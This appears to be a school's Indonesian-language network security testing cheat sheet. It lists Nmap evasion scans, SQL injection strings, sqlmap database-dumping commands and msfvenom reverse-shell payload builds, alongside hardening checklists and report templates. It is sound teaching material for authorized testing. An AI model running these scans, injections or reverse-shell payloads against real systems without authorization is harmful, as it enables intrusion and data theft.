# 📚 Cheat Sheet & Template Penting

## 1. Perintah Nmap Penting

### 1.1 Pemindaian Dasar
```bash
# Pemindaian cepat port TCP
nmap -T4 -F [TARGET]

# Pemindaian versi layanan
nmap -sV -sC [TARGET]

# Pemindaian semua port TCP
nmap -p- -T4 [TARGET]

# Pemindaian UDP
nmap -sU -p 53,67,68,69,123,161,162 [TARGET]

# Pemindaian OS dan versi
nmap -O -sV [TARGET]
```

### 1.2 Pemindaian Lanjutan
```bash
# Pemindaian dengan script NSE bawaan
nmap --script=vuln [TARGET]

# Pemindaian dengan waktu yang tidak mencolok
nmap -T2 -f --data-length 16 --max-retries 3 [TARGET]

# Simpan hasil dalam format berbeda
nmap -oN normal.txt -oX xml_output.xml [TARGET]

# Scan dengan deteksi firewall/IDS
nmap -sS -sV --script=http-waf-detect [TARGET]
```

## 2. SQL Injection Cheat Sheet

### 2.1 Deteksi SQLi
```sql
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
' OR '1'='1'/*
' OR '1'='1'#
```

### 2.2 Eksploitasi dengan SQLmap
```bash
# Deteksi parameter rentan
sqlmap -u "http://example.com/page.php?id=1" --forms --crawl=1

# Dump database
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Dump tabel dari database tertentu
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# Dump isi tabel
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump
```

## 3. Template Laporan Keamanan

### 3.1 Ringkasan Eksekutif
```markdown
# LAPORAN PENGUJIAN KEAMANAN

## Informasi Umum
- **Tanggal Pengujian**: [Tanggal]
- **Tim Penguji**: [Nama Anggota]
- **Lingkup Pengujian**: [Deskripsi Singkat]

## Ringkasan Temuan
| Tingkat Keparahan | Jumlah |
|-------------------|--------|
| Kritis           | X      |
| Tinggi           | X      |
| Sedang           | X      |
| Rendah           | X      |

## Rekomendasi Utama
1. [Rekomendasi 1]
2. [Rekomendasi 2]
3. [Rekomendasi 3]
```

### 3.2 Template Temuan Kerentanan
```markdown
## [ID] Nama Kerentanan

### Deskripsi
[Penjelasan detail kerentanan]

### Dampak
- [ ] Confidentiality
- [ ] Integrity
- [ ] Availability

### Tingkat Keparahan
[Kritis/Tinggi/Sedang/Rendah]

### Bukti
```
[Perintah/Output yang relevan]
```

### Rekomendasi
1. [Rekomendasi 1]
2. [Rekomendasi 2]

### Referensi
- [CVE-XXXX-XXXX](link)
- [OWASP: Nama Kerentanan](link)
```

## 4. Metasploit Framework

### 4.1 Perintah Dasar
```bash
# Memulai Metasploit
msfconsole

# Mencari modul
search [jenis/exploit/auxiliary]

# Menggunakan modul
use [path/module]

# Menampilkan opsi
show options

# Menjalankan exploit
exploit
```

### 4.2 Membuat Payload
```bash
# Windows Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > shell.exe

# Linux Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > shell.elf

# Web Shell PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > shell.php
```

## 5. Web Application Testing

### 5.1 OWASP ZAP
```bash
# Pemindaian dasar
zap-cli quick-scan -s all http://example.com

# Pemindaian otentikasi
zap-cli -p 8080 -v quick-scan -s all -r http://example.com/login --form-param "username=test&password=test"

# Ekspor hasil
zap-cli -p 8080 report -o results.html -f html
```

### 5.2 Burp Suite
1. Konfigurasi browser untuk menggunakan proxy Burp (biasanya 127.0.0.1:8080)
2. Aktifkan intercept di tab "Proxy"
3. Gunakan "Repeater" untuk memodifikasi request
4. Gunakan "Intruder" untuk serangan otomatis
5. Gunakan "Scanner" untuk pemindaian otomatis

## 6. Hardening Checklist

### 6.1 Sistem Operasi
- [ ] Update sistem terbaru
- [ ] Nonaktifkan layanan tidak perlu
- [ ] Konfigurasi firewall yang ketat
- [ ] Aktifkan audit logging

### 6.2 Jaringan
- [ ] Segmentasi jaringan
- [ ] IDS/IPS aktif
- [ ] Enkripsi data transit
- [ ] Monitoring lalu lintas

### 6.3 Aplikasi Web
- [ ] Input validation
- [ ] Proteksi XSS
- [ ] Proteksi SQL Injection
- [ ] Konfigurasi header keamanan

## 7. Referensi Cepat

### 7.1 Port Penting
| Port | Layanan | Keterangan |
|------|---------|------------|
| 20/21 | FTP | File Transfer Protocol |
| 22 | SSH | Secure Shell |
| 23 | Telnet | Unencrypted remote access |
| 25 | SMTP | Email sending |
| 53 | DNS | Domain Name System |
| 80 | HTTP | Web traffic |
| 443 | HTTPS | Secure web traffic |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote Desktop |

### 7.2 Sumber Daya Online
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## 8. Template Laporan Insiden Keamanan

```markdown
# LAPORAN INSIDEN KEAMANAN

## Informasi Dasar
- Nomor Tiket: 
- Dilaporkan Oleh: 
- Tanggal/Waktu: 
- Sistem Terdampak: 
- Kategori Insiden: 

## Kronologi
1. [Waktu] - [Aktivitas]

## Analisis Dampak
- Aset Terdampak:
- Dampak Bisnis:
- Dampak Hukum/Regulasi:

## Tindakan yang Dilakukan
1. [Tindakan] - [Waktu] - [Pelaksana]

## Rekomendasi
1. [Rekomendasi 1]
2. [Rekomendasi 2]

## Lampiran
- [ ] Screenshot
- [ ] Log
- [ ] Bukti Lainnya
```

---
<div align="center">
  <p>Cheat Sheet & Template - Pengujian Keamanan Jaringan</p>
  <p>© 2025 SMKN 1 Punggelan - Revisi 1.0</p>
</div>
